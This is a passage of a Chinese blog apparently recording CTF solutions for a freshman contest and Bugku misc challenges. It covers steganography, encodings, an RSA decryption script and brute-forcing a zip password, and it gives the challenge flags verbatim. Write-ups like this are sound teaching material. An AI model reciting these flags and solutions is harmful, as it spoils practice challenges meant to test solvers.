曲阜师范大学</h3><p>他已经给出了提示，感觉里面全是文字，我们可以用winhex看看这个题，这里需要用到第一题常用文件头的知识。然后还需要一个formost工具，工具已经提供了。后续还有一步密码破解，试试究竟是找出密码还是怎么做吧？</p><h2 id="（二）web"><a href="#（二）web" class="headerlink" title="（二）web"></a>（二）web</h2><p>关于web在这里我其实想吐槽一句，这个真是是给21级新生做的吗？居然考了sql注入和php反序列化。</p><h3 id="1-Easy-Web"><a href="#1-Easy-Web" class="headerlink" title="1.Easy_Web"></a>1.Easy_Web</h3><p>如题easy web，很多靶场都会有这一种类型的题目，是最经典的送分题。</p><h3 id="2-Findit"><a href="#2-Findit" class="headerlink" title="2.Findit"></a>2.Findit</h3><p>这一道题，较上一道题难度有所提升，flag被分成了两块，试着找出来吧（说实话我一开始以为那部分缺的一半是自己猜的呢），注意在找到前半部分的flag之后不要尝试去补全句子，这样是得不到flag的。</p><h2 id="（三）Crypto"><a href="#（三）Crypto" class="headerlink" title="（三）Crypto"></a>（三）Crypto</h2><h3 id="1-签到-1"><a href="#1-签到-1" class="headerlink" title="1. 签到"></a>1. 签到</h3><p>这道题实际上就是base64，关于base系列的密码有一整个系列，如base32，base64，base96等。</p><blockquote><p>cWZudXtodWFuX3lpbmdfbGFpX2Rhb19xdV95dWFuX2RhX2ppYV90aW5nfQ==</p></blockquote><h3 id="2-栅栏密码"><a href="#2-栅栏密码" class="headerlink" title="2.栅栏密码"></a>2.栅栏密码</h3><p>这个真就是栅栏密码，这两个题都属于是古典密码，类似的还有很多，这类密码最重要的</p><blockquote><p>qn{nls_ss_a}fuegihi_onn</p></blockquote><h3 id="3-emoji密码"><a href="#3-emoji密码" class="headerlink" title="3. emoji密码"></a>3. emoji密码</h3><p>一个用颜表情做的密码，这个密码在之前我也没见过，这种就是考察查找利用知识对能力和快速学习的能力。</p><h3 id="4-BrainFUCK"><a href="#4-BrainFUCK" class="headerlink" title="4. BrainFUCK"></a>4. BrainFUCK</h3><p>BrainFUCK正好是一种密码的方式，不过这道题更多了一些小心思。</p><h3 id="5-RSA"><a href="#5-RSA" class="headerlink" title="5.RSA"></a>5.RSA</h3><p>这道题也是我硕抱怨的另一个点，这道题是RSA加密算法，解决的话需要会编写脚本的能力，和对RSA密码的了解，在这里提供一个<a href="http://ctf.ssleye.com/pub_asys.html">公钥分析</a>的网址，通过这里可以提取n和e，</p><blockquote><p> cmd 进入 yafu 的解压目录，输入 yafu-x64<br>factor(需要分解的大数)<br>遇到因数位数过长：新建文件 p.txt，内容写上 n 的值，最后面要换行<br>yafu-x64 “factor(@)” -batchfile p.txt </p></blockquote><p>这是题库wp里提供的解题思路，不过这一道题完全可以使用在线的解题工具分解n得到指数p和q，这是<a href="http://factordb.com/">解题工具</a>。在通过编写脚本完成解题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> rsap <span class="token operator">=</span> <span class="token number">55801219744752013328353829126338788731389</span>q <span class="token operator">=</span> <span class="token number">1306404104626383868633664968881427933</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">72898942517702846572619158917269560125985151716076557250750365689783898488937</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>a<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(四)Reverse</p><p>reverse的题目至少第一二道很简单，都可以看看，这里就不写解题过程了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU靶场解题记录之misc(一)</title>
      <link href="/2021/08/01/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/"/>
      <url>/2021/08/01/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc/</url>
      
        <content type="html"><![CDATA[<h4 id="bugkuctf解题记录之misc-一">BugkuCTF解题记录之misc（一）</h4><hr><p>[TOC]</p><hr><h5 id="1-签到题">1、签到题</h5><p>直接扫描二维码就行，这是最简单的签到题</p><h5 id="2-0和1的故事">2、 0和1的故事</h5><p>这道题是一个较为常见的二维码隐写题目，用0和1分别作为二维码的黑色与白色部分。在使用工具扫码得到flag。</p><p>这种题目的难点在于，二维码的生成，个人感觉还是用python写一个脚本做最方便。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 7*7的定位标志</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 左上角定位标志</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 左下角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">></span> <span class="token number">17</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 右上角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">17</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过我还是看到了一个神奇的解法，<a href="https://blog.csdn.net/qq_52715164/article/details/119054663">来自评论区的神奇解法</a>，这个解法是一种很神奇的操作，将01串放在Excel里，将其设计成正方形的单元格。在把为1的用黑色填充。最后把其他的部分p上…</p><ol><li>之前解其他题也用过一个类似的脚本</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">25</span>y <span class="token operator">=</span> <span class="token number">25</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        ff <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过这个脚本的问题是在这个题中你还得将三个角上面的01串改成正常的识别区域（下面这个脚本生成的图片清晰度一直令人发指）。</p><p>使用工具扫描二维码得到flag。</p><blockquote><p>flag{QR_c0de_1s_1nterest1n9}</p></blockquote><h5 id="3-这是一张单纯的图片">3、这是一张单纯的图片</h5><p>这个题怎么说呢？解法多种多样…</p><p>用winhex或者直接用记事本打开都能看到这一串</p><pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际上这个是 html 编码后的串直接解码得到key{you are right}</p><p>当然我看到评论区有个人的方法是直接改拓展名为是HTML，这样更方便，毕竟这都不需要多一步解码了。</p><h5 id="4-隐写">4、隐写</h5><p>这个是最简单的隐写，鼠标右键属性可以查看图片的行高和列宽，都是500，用winhex打开，发现行长为01F4，列高为01A4，修改列高再看图片就行了。</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h5 id="5-telnet">5、telnet</h5><p>这个题使用wireshark里面的追踪Tcp流就能直接得到flag。</p><h5 id="6-眼见非实">6、眼见非实</h5><p>打开文件发现里面写了PK，好吧压缩包，改拓展名改为zip，最基础的方式是一个个找好在文件不多用不了几分钟，当然有很多公具能够帮我们完成检索。这里就不一一列举</p><p>得到<strong>flag{F1@g}</strong></p><h5 id="7-啊哒">7、啊哒</h5><p>这里引入一个工具Formost，这个工具可以拆解文件。下载图片发送到Formost分解得到一个压缩包，压缩包需要密码进行解压，这个时候不要忘记观察图片的属性，属性里有一串16进制的代码，将其转化成字符串就是相应的解压密码sdnisc_2018。得到flag<img src="ada.jpg" alt="ad" style="zoom:50%;" /></p><blockquote><p>flag : flag{3XiF_iNf0rM@ti0n}</p></blockquote><h5 id="8-ping">8、ping</h5><p>这道题我一时间想不到说什么好，这个是正常人想出来的操作，下载得到一个流量包，这个流量包全部是ICMP流，这道题真的跟题目一样是拼， 最简单的解法wireshark打开一个包一个包看下面字符，进行拼接得到flag 。</p><h5 id="9-可爱的故事">9、可爱的故事</h5><blockquote><p>可可爱爱没有脑袋</p><p>一‌‍‍‎‍‎‍‌‌‎‌‎‍‌‏‍‏‌‎‌‏‏‍‌‎‍‍‌‎‏‎‍‌‏‎‍‏‏‌‎‍‎‍‌‌‌‎‍‌‌‍‍‌‎‏‍‍‌‏‌‎‍‌‍‌‌‍‌‌‍‌‌‍‌‎‍‍‌‎‌‎‏‍‏‏‌‌‎‌‍‏‎‌‌‍‍‍‌‎个可爱的故事<br>这‍‌‍‌‎‌‏‏‍‌‎‍‌‍‍‎‏‏‌‌‏‌‌‏‌‍‍‌‎‏‍‏‏‌‏‎‎‏‌‌‍‏‍‍‌‎‏‎‌‌‌‏‎‎‎‌‍‍‎‏‎‎‏‏‍‌‌‌‏‏‍‌‌‌‏‏‍‌‌‌是一种奇怪的文字写的故事<br>f‍‌‎‏‎‍‌‏‎‍‏‏‌‏‎‎‏‏‌‏‎‍‎‎‌‌‍‌‌‍‌‌‍‌‎‍‌‏‌‏‎‍‌‎‏‍‍‌‏‌‎‍‌‍lag就藏在其中<br>flag为大兔子说的一句带bugku的话<br>如‌‌‎‎‌‍‌‏‎‎‏‌‌‍‏‍‏‏‍‌‎‍‌‌‎‎‌‍‌‏‎‎‏‌‌‍‏‍‏‏‍‌‎‍‌‌‌‏‏‌‌‌‍‌‎‌‍‏‌‌‏‌‍‍‌‎‍‍‎‏‍‌‎‍‍‎‏‍‍‌‎‏‎‌‌‎‎‌‎‌‍‎‎‎‍‎‌‎‌‏‌‌‏‌‌‍‌‌‍‌‌‍‌‎‌‎‌‍‏‎‌‌‍‍‍‌‎‌‌‏‍‌‎‎‏‏‍‌‌‌果找到了<br>就‌‌‍‏‍‌‌‍‌‎‌‍‏‌‎‏‍‍‌‏‌‎‍‌‍‌‌‏‌‎‌‍‌‏‍‌‏‎‌‍‌‌‍‎‎‌‍‏‎‌‏‌‏‎‍‎‎‍‌‍‌‍‌‍‍‍‏‌‍‌‍‌‌‍‍‏‌‌‏‍‏‏‎‍‌‏‏‎‍‏‍‌‏‎‍‎‍‍‎‎‎‍‌‏‏‌‍‌‍‌‌‌‍‌‌‎‎‌‍‏‏‍‍‍‌把他全部变成小写然后包上bugku{}</p></blockquote><p>来看下这个题给的图片…</p><blockquote><p>这是人的语言吗？？？？？</p></blockquote><p>直到我看到别人的解答里来了一句，原神里面的提瓦特字母 …</p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;iamlearningteyvatinbugku&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得，我裂开了…</p><blockquote><p>2022年3月20日，原神真香</p></blockquote><h5 id="10-赛博朋克">10、赛博朋克</h5><p>flag{Hel1o_Wor1e}</p><h5 id="11-猜">11、猜</h5><p>这题还真是猜…, 图中人物名字全拼。打开照片一看刘亦菲，嗯金币-1…</p><pre class="line-numbers language-none"><code class="language-none">flag:   key&#123;liuyifei&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="12-又一张图片还单纯吗？">12、又一张图片还单纯吗？</h5><p>这个题，最简单的方法是使用formost进行分解，分解得到的那张图片上面的就是flag，正常的做法实际上不应该直接使用formost。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;对于图片隐写题目，推荐先看属性查看是否有隐藏的信息，再使用 010edit 或者winhex查看图片信息&#x2F;&#x2F;使用winhex查看文件， 搜索504b 0304（压缩包头），FFD8FF（jpg文件头） ，89504E47（png文件头）&#x2F;&#x2F;确定在文件中隐藏其他文件时再使用formost进行分解。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="13-社会主义核心价值观">13、社会主义核心价值观</h5><p>嗯，这道题是不是可以扔到密码学里面，这是一个神奇的编码，知道有这种编码方式解决就行。</p><h5 id="14-where-is-flag-番外篇">14、where is flag 番外篇</h5><p>这道题的脑洞是真大…</p><ol><li><p>解压全部文件得到一个加密压缩包，和一堆经过修改的出师表…</p></li><li><p>在看到这一堆出师表后，我觉得还不如去看看，那个加密压缩包是不是伪加密，用winhex打开，最后一通操作下来确定这个是正常加密…</p></li><li><p>经过刚刚的两部操作，实际上已经确认了这个的解压密码与这一堆叫做出师表文件有关。但是看文件那一堆AAAAA，CCCCC，我觉得这个密码可能是这些字母的数量…结果还是小瞧了出题人。</p></li><li><p>在评论区有大佬这么提示：**每个文档的字数不一样会对文档的大小产生影响，而有的文档最后之所有有大写字母来填充，那么就是为了凑文档大小的数字！！！ **</p></li><li><p>好家伙这一层实际上是用压缩前的大小减去压缩后大小的差…</p><pre class="line-numbers language-none"><code class="language-none">75 101 121 58 90 104 117 71 76 64 64 46 48<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到这一串，这一串实际上是ascll码的形式，<strong>ZhuGL@@.0</strong>这个就是最好的密码…</p></li><li><p>得，又一张图片看下里面属性啥也没有，使用winhex打开，拖到最后看到这一串</p><pre class="line-numbers language-none"><code class="language-none">flag in here &#123;LjFWBuxFNTzEWv6t2NfxjNFSH1sQEwBt5wTTLD1fJ&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果这个并不是flag…出题人我劝你善良…</p><p>里面这一串是base编码，但是不是我们最熟悉的base64，是神奇的base58…</p><blockquote><p><strong>base58</strong>:编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。</p></blockquote></li></ol><p>最后 bugku{th1s_1s_chu_Sh1_B1A0!!@} …</p><p>说真的出题人我劝你善良…</p><h5 id="15-贝斯手">15、贝斯手</h5><p>看下题目给的提示…</p><blockquote><p>这剧叫做《缝纫机乐队》，女主叫丁建国，是一名贝斯手，剧中面试的时候，问到腿是怎么回事的时候，回答了&quot;又长又白又细&quot;，我爱了，成功圈粉</p></blockquote><p>txt看上去是没东西了，但实际上这是个假象，在txt最后还有一段提示</p><blockquote><p>密码我4不会告诉你的，除非你知道我的女神是哪一年出生的给你个提示：申猴，闰年</p></blockquote><p>这里如果说考了什么内容的话，应该说是细心观察和知识检索的能力…</p><pre class="line-numbers language-none"><code class="language-none">5+58&#x3D;&#x3D;327a6c4304ad5938eaf0efb6cc3e53dcCFmZknmK3SDEcMEue1wrsJdqqkt7dXLuS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个其实是一段md5和一段base58，千万别以为是先md5后base58来着…小写的那部分是md5，因为存在0很容易确认，相应的大写的范围是base58</p><p>得到<strong>flag{this_is_md5_and_base58}</strong></p><h5 id="16-隐写2">16、隐写2</h5><ul><li><p>这个隐写题的难度也不是很大， 从网站上下载下来就是一张图片，同过winhex分析其中包含一个zip压缩包。 使用formost分解即可。得到一个名为flag的压缩包还有一个图片。根据图片提示的信息三位数字…这样直接暴力跑就能得出来了。使用ARCHPR暴力破解就能得到密码871</p></li><li><p>单纯给了三个字母，对应三个数字，肯定不可能是在字母表里的顺序，对应键盘，则Q对应数字1，J对应数字7，K对应数字8（在键盘同一列）。</p><p>得到的是一张图片用winhex打开在最后发现这一串</p><pre class="line-numbers language-none"><code class="language-none">f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE&#x3D;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过里面的是base64编码，稍微解码下得到<strong>flag{y0u Are a h@cker!}</strong></p></li></ul><h5 id="17-普通的二维码">17、普通的二维码</h5><ol><li><p>下载得到一张图片是一张二维码，使用工具扫码，他告诉我flag不在这里…</p></li><li><p>使用winhex打开有这一段（这里我已经将其三个一组分开）</p><pre class="line-numbers language-3" data-language="3"><code class="language-3">146，154，141，147，173，110，141，166，145，137，171，060，125，137，120，171，137，163，143，162，151，160，164，137，117，164，143，137，124，157，137，124，145，156，137，101，163，143，151，151，041，175，@xjseck!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里能看出数字永远是0到7，应该是八进制将其转化为10进制，在将其视为对应的ascill码</p></li><li><p>对应脚本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;int main()&#123;int misc1[42]&#x3D;&#123;146,154,141,147,173,110,141,166,145,137,171,60,125,137,120,171,137,163,143,162,151,160,164,137,117,164,143,137,124,157,137,124,145,156,137,101,163,143,151,151,41,175&#125;;char misc2[42];int a1,a2,a3;for(int i&#x3D;0;i&lt;42;i++)&#123;a1&#x3D;misc1[i]&#x2F;100;a2&#x3D;misc1[i]&#x2F;10%10;a3&#x3D;misc1[i]%10;        misc2[i]&#x3D;a1*8*8+a2*8+a3;&#125;for(int j&#x3D;0;j&lt;42;j++)&#123;printf(&quot;%c&quot;,misc2[j]);&#125;printf(&quot;\n&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Have_y0U_Py_script_Otc_To_Ten_Ascii!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="18-多种方法解决">18、多种方法解决</h5></li></ol><ul><li><p>将文件转化成txt格式，打开文件里面是这么一堆东西</p><pre class="line-numbers language-none"><code class="language-none">data:image&#x2F;jpg;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAYAAAB12js8AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAArZSURBVHhe7ZKBitxIFgTv&#x2F;396Tx564G1UouicKg19hwPCDcrMJ9m7&#x2F;7n45zfdxe5Z3sJ7prHbf9rXO3P4lLvYPctbeM80dvtP+3pnDp9yF7tneQvvmcZu&#x2F;2lf78zhU+5i9yxv4T3T2O0&#x2F;7eud68OT2H3LCft0l&#x2F;ae9ZlTo+23pPvX7&#x2F;rwJHbfcsI+3aW9Z33m1Gj7Len+9bs+PIndt5ywT3dp71mfOTXafku6f&#x2F;2uD09i9y0n7NNd2nvWZ06Ntt+S7l+&#x2F;68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTtDklqXMnsZxY33LCPiVtbpKUX7&#x2F;rwwlzk7Q5JalzJ7GcWN9ywj4lbW6SlF+&#x2F;68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTWE7a&#x2F;i72PstJ2zfsHnOTpPz6XR9OmJvEctL2d7H3WU7avmH3mJsk5dfv+nDC3CSWk7a&#x2F;i73PctL2DbvH3CQpv37XhxPmJrGctP1d7H2Wk7Zv2D3mJkn59bs+nDA3ieWEfdNImylJnelp7H6bmyTl1+&#x2F;6cMLcJJYT9k0jbaYkdaansfttbpKUX7&#x2F;rwwlzk1hO2DeNtJmS1Jmexu63uUlSfv2uDyfMTWI5Yd800mZKUmd6Grvf5iZJ+fW7PjzJ7v12b33LSdtvsfuW75LuX7&#x2F;rw5Ps3m&#x2F;31rectP0Wu2&#x2F;5Lun+9bs+PMnu&#x2F;XZvfctJ22+x+5bvku5fv+vDk+zeb&#x2F;fWt5y0&#x2F;Ra7b&#x2F;ku6f71+++HT0v+5l3+tK935vApyd+8y5&#x2F;29c4cPiX5m3f